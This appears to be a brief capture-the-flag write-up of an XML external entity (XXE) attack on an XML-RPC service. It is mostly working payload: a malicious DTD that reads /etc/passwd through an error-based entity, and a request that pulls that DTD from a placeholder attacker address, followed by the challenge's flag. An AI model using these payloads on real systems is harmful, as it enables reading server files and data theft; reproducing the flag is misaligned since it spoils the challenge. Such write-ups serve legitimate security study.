## Exfiltrate some /etc/passwd content

malicious.dtd:
```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;
```

Request:
```xml
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE foo [
<!ENTITY % xxe SYSTEM "http://YOUR-IP-ADDRESS/malicious.dtd"> %xxe;]
> 
<methodCall>
<methodName>demo.sayHellokk</methodName>
  <params>
    <param>
      <value>
      <int>&file;</int>
...
```

## Flag

`DGA{5d15975aabc37d088c6f594d927155d93ae57cdd}`
